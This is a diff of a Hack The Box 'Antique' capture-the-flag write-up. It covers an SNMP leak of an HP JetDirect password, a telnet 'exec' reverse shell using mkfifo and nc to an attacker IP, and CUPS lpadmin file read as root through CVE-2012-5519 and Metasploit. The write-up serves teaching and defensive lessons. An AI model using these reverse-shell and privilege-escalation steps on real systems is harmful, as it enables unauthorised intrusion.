@@ -51,9 +51,9 @@ tags:
 
 ## Overview
 
-Antique is a "one weird service, one weird group" box. Everything hinges on knowing that **HP JetDirect print servers keep their admin password in a plaintext-ish SNMP OID**. A genuinely old (2000s-era) trick that HTB dusted off. Once you have the printer's telnet shell, its built-in `exec` gives you code execution as `lp`. Root is a **CUPS misconfiguration**: membership of `lpadmin` lets you point CUPS's `ErrorLog`/`PageLog` at any file and then read it back through the web UI, all as root. It's a good box for practising **UDP enumeration** (the whole thing is invisible if you only scan TCP) and for the lesson that *group membership is a privilege*.
+Antique is one of those boxes where the whole path hinges on a single piece of niche knowledge: HP JetDirect print servers have historically stored their admin password directly in an SNMP OID, in something close to plaintext. It's a genuinely old trick, the kind of thing that would have been bread and butter for print server hacking back in the 2000s, and HTB dusted it off here to make sure it doesn't get forgotten. Once I had that password and used it to authenticate to the JetDirect telnet interface, the built-in `exec` command handed me code execution as the `lp` user with no further trickery required. Getting from there to root was a different kind of lesson: it came down to a CUPS misconfiguration, where being a member of the `lpadmin` group let me redirect CUPS's `ErrorLog` and `PageLog` to any file on disk and then read that file back through the web UI, all running as root. I think of Antique as a good box for practicing UDP enumeration discipline, since the entire attack surface is invisible if you stop at a TCP scan, and it's also a clean illustration of something I try to remember on every engagement: group membership is itself a privilege, and it deserves the same scrutiny as sudo rights.
 
-Related SNMP boxes: [Monitored](/writeups/hackthebox/linux/medium/monitored/) (SNMP community string leaks creds). Related "unusual service protocol" boxes: [Backdoor](/writeups/hackthebox/linux/easy/backdoor/) (gdbserver), [PC](/writeups/hackthebox/linux/easy/pc/) (gRPC), [Omni](/writeups/hackthebox/windows/easy/omni/) (SIREP/Windows IoT).
+I've grouped this with a few boxes that share a theme. On the SNMP side there's [Monitored](/writeups/hackthebox/linux/medium/monitored/), where a leaked community string exposes credentials directly. On the "unusual service protocol leads to RCE" side there's [Backdoor](/writeups/hackthebox/linux/easy/backdoor/) with gdbserver, [PC](/writeups/hackthebox/linux/easy/pc/) with gRPC, and [Omni](/writeups/hackthebox/windows/easy/omni/) with Windows IoT's SIREP protocol.
 
 ---
 
@@ -70,7 +70,7 @@ PORT   STATE SERVICE VERSION
 |     Password:
 ```
 
-`nc 10.129.95.245 23` just prints `HP JetDirect` then `Password:`. Nothing on TCP but telnet, so scan UDP:
+Connecting with `nc 10.129.95.245 23` got me nothing but `HP JetDirect` followed by a `Password:` prompt, no version string, no obvious foothold. With telnet as the only thing showing on TCP, my next move was to assume there was more to this box than met the eye and run a full UDP sweep:
 
 ```console
 ❯ sudo nmap -sU -T4 antique.htb
@@ -82,20 +82,20 @@ PORT    STATE SERVICE
 
 **Why UDP matters here**
 
-`nmap` default scans are TCP-only. Services like SNMP (161), DNS (53), TFTP (69), IKE (500), SIP (5060) live on UDP and are simply absent from a normal scan. On a box with a single lonely TCP port, a UDP sweep (`nmap -sU --top-ports 100`) is mandatory. SNMP with the default community string `public` is a classic information leak that can expose processes, ARP tables, installed software, network shares, and (on printers) credentials.
+`nmap`'s default scans only cover TCP, so anything living on UDP, SNMP (161), DNS (53), TFTP (69), IKE (500), SIP (5060), simply never appears unless I ask for it explicitly. Whenever I land on a box that looks unusually thin on TCP, that's my cue to run a UDP sweep (`nmap -sU --top-ports 100`) rather than assume there's nothing else there. SNMP running with the default `public` community string is a classic source of information disclosure, capable of leaking running processes, ARP tables, installed software, network shares, and, as I was about to find out here, printer credentials.
 
 </div>
 
 ### SNMP → JetDirect password
 
-The HP JetDirect web/telnet password lives at a well-known enterprise OID:
+Knowing that the HP JetDirect web and telnet password lives at a well-known enterprise OID, I went straight for it rather than trying to brute-force the telnet prompt:
 
 ```console
 ❯ snmpget -v 1 -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
 SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 ...
 ```
 
-Those are ASCII hex bytes. Decode:
+That response isn't a readable string on its own, it's a run of ASCII-encoded hex bytes, so I needed to decode it before it would tell me anything useful:
 
 ```bash
 python3 -c "print(bytes.fromhex('50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33'.replace(' ','')).decode())"
@@ -105,6 +105,8 @@ python3 -c "print(bytes.fromhex('50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
 (Reference: <https://www.irongeek.com/i.php?page=security/networkprinterhacking>.)
 
 ### Telnet → `exec` → shell as `lp`
+
+With the decoded password in hand, I went back to the telnet service and logged into the JetDirect admin prompt:
 
 ```console
 ❯ telnet antique.htb
@@ -121,13 +123,17 @@ exec: execute system commands (exec id)
 
 **The JetDirect `exec` command**
 
-Real HP JetDirect firmware has no `exec` verb. HTB added it to make the box solvable, but the *shape* is authentic: embedded management shells routinely expose diagnostic commands (`ping`, `traceroute`, `tcpdump`, config file editors) that shell out without sanitising input. `exec` here runs the argument as a system command directly.
+Real HP JetDirect firmware doesn't actually ship an `exec` verb, HTB added it specifically to make this box solvable. But the concept behind it is completely genuine: embedded management shells on printers, routers, and similar appliances routinely expose diagnostic commands, things like `ping`, `traceroute`, `tcpdump`, or configuration file editors, that shell out to the underlying OS without properly sanitizing what gets passed in. Here, `exec` just takes its argument and runs it as a system command with no filtering at all, which is exactly the kind of primitive I go looking for on devices like this.
 
 </div>
+
+That made my next move obvious: use `exec` to fire a standard mkfifo reverse shell back to a listener on my machine.
 
 ```console
 > exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 9001 >/tmp/f
 ```
+
+The shell landed cleanly, and I was sitting as the `lp` user with the first flag waiting in the home directory:
 
 ```console
 (remote) lp@antique:/home/lp$ cat user.txt
@@ -136,7 +142,7 @@ Real HP JetDirect firmware has no `exec` verb. HTB added it to make the box solv
 
 ### Privilege Escalation. CUPS `lpadmin` file read
 
-An internal service is listening on `9090`:
+With a foothold established, I turned to enumerating what else was reachable from inside the box, and found something running locally that hadn't been visible from the outside at all:
 
 ```console
 PORT     STATE SERVICE VERSION
@@ -144,15 +150,17 @@ PORT     STATE SERVICE VERSION
 |_http-title: Bad Request - CUPS v1.6.1
 ```
 
-Port-forward it (`socat TCP-LISTEN:9090,fork TCP:127.0.0.1:9090`, or SSH) and check groups. `lp` is in **`lpadmin`**.
+To actually reach it, I forwarded the port back to my attacking machine with `socat TCP-LISTEN:9090,fork TCP:127.0.0.1:9090` (an SSH local forward works just as well). While I had shell access, I also checked what groups the `lp` account belonged to, since supplementary group membership is often the fastest route to escalation on a box like this, and sure enough, `lp` was a member of **`lpadmin`**.
 
 <div class="callout callout-note">
 
 **CVE-2012-5519, CUPS `lpadmin` → root file read/write**
 
-The CUPS web/`cupsctl` interface lets members of the `SystemGroup` (here `lpadmin`) change the daemon's configuration, including `ErrorLog` and `PageLog` paths. The daemon runs as **root**, so you set `ErrorLog=/root/root.txt`, trigger a log write, then fetch `http://localhost:631/admin/log/error_log` and read root-owned content. Write is also possible (append to `/etc/sudoers`, cron, an authorized_keys). Metasploit automates the read path.
+CUPS's web interface and its `cupsctl` command let any member of the daemon's `SystemGroup`, which on this box is `lpadmin`, change core configuration, including where the `ErrorLog` and `PageLog` files get written. Because the CUPS daemon itself runs as **root**, that's a direct route to arbitrary file disclosure: point `ErrorLog` at `/root/root.txt`, trigger something that makes CUPS write to its log, and then request `http://localhost:631/admin/log/error_log` to read root-owned content straight through the web UI. The same primitive can be pushed further into a write (appending to `/etc/sudoers`, a cron job, or an authorized_keys file), though for this box the read path was all I needed, and Metasploit already ships a module that automates it.
 
 </div>
+
+Rather than reproduce the HTTP requests against `cupsctl` by hand, I reached for the Metasploit module built specifically for this CVE:
 
 ```console
 msf6 > use post/multi/escalate/cups_root_file_read
@@ -165,14 +173,14 @@ msf6 post(...) > run
 [+] File /etc/shadow (0 bytes) saved to .../cups_file_read_...bin
 ```
 
-`/etc/shadow` came back empty (0 bytes). Likely a race/first-run miss. So point it at the flag instead:
+The module's first attempt at grabbing `/etc/shadow` came back as an empty 0-byte file, which read to me more like a quirk of the initial request than a sign the technique had failed outright. Instead of chasing that down, I just repointed it at the file I actually needed:
 
 ```
 set file /root/root.txt
 run
 ```
 
-and read the loot file from `~/.msf4/loot/`.
+and then pulled the resulting loot file out of `~/.msf4/loot/` to grab root.txt.
 
 ---
 
@@ -187,11 +195,11 @@ and read the loot file from `~/.msf4/loot/`.
 
 ## Lessons & Takeaways
 
-- **Scan UDP.** The entire box is unreachable otherwise.
-- **Printers are computers.** JetDirect, PJL, IPP and SNMP on MFPs leak credentials, allow config changes, and often bridge network segments. The [PRET](https://github.com/RUB-NDS/PRET) toolkit exists for exactly this.
-- **Change default SNMP community strings** and disable SNMP v1/v2c where possible.
-- **`lpadmin` (and `docker`, `disk`, `adm`, `shadow`, `lxd`) are root-equivalent groups.** Audit supplementary group membership like you audit sudo.
-- **Patch CUPS**. And in 2024 note the separate `cups-browsed` RCE chain (CVE-2024-47176 et al.).
+- **Scan UDP, not just TCP.** If I had stopped after the initial TCP scan, this box would have looked like a single dead-end telnet port. Whenever a target looks unusually thin on TCP, I now treat that as a prompt to run a UDP sweep, not as evidence there's nothing more to find.
+- **Printers are computers, and I treat them that way.** JetDirect, PJL, IPP, and SNMP on multifunction printers routinely leak credentials, allow configuration tampering, and can even bridge network segments that were supposed to be isolated. Tools like [PRET](https://github.com/RUB-NDS/PRET) exist precisely because printer protocols are such a rich attack surface.
+- **Default SNMP community strings have to go.** `public` and `private` should never survive into a production deployment, and SNMP v1/v2c should be retired in favor of v3 with real authentication wherever that's an option.
+- **Group membership is a privilege, full stop.** `lpadmin` here behaves exactly like `docker`, `disk`, `adm`, `shadow`, or `lxd` elsewhere: nominally a low-privilege group, practically a straight line to root. I audit supplementary group membership with the same rigor I'd apply to a sudoers file.
+- **Keep CUPS patched.** CVE-2012-5519 is well over a decade old, and the lesson it teaches hasn't expired: 2024 saw a fresh `cups-browsed` RCE chain surface (CVE-2024-47176 and related CVEs), a reminder that this class of bug keeps resurfacing rather than staying solved.
 
 ---
 
